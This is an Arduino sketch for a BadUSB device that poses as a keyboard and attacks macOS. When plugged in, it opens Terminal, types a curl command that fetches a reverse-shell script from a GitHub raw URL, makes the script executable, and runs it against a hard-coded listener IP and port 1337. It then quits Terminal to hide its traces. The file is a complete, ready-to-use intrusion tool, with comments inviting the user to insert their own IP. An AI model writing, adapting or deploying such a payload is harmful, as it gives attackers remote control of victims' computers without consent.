#include "Keyboard.h"

// Define the payload name, IP, and PORT at the beginning
const char* payloadName = "revshellMacnLinux.sh";
const char* IP = "10.119.208.118";  // Replace with your IP address
const char* PORT = "1337";      // Replace with your port number

void setup() {
  // Begin the Keyboard
  Keyboard.begin();

  // Wait for a moment
  delay(1000);

  // Open terminal (this example uses the shortcut for macOS, adjust for your target OS)
  Keyboard.press(KEY_LEFT_GUI);  // Command key on macOS
  Keyboard.press(' ');           // Space key
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("terminal");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);

  // Download the payload using curl
  Keyboard.print("curl -o " + String(payloadName) + " https://raw.githubusercontent.com/SkepticSeptic/badUSBonlinePayload/main/" + String(payloadName));
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(2000);  // Wait for download to complete

  // Give execute permissions
  Keyboard.print("chmod +x " + String(payloadName));
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);

  // Run the payload with IP and PORT arguments
  Keyboard.print("./" + String(payloadName) + " -I " + String(IP) + " -P " + String(PORT));
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);


  // Close all running apps (to close terminal)
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  // Close terminal (optional)
  Keyboard.press(KEY_LEFT_GUI);  // Command key on macOS
  Keyboard.press('q');           // Q key for quit
  Keyboard.releaseAll();
  delay(500);

  // End the Keyboard
  Keyboard.end();
}

void loop() {
  // Nothing to do here
}
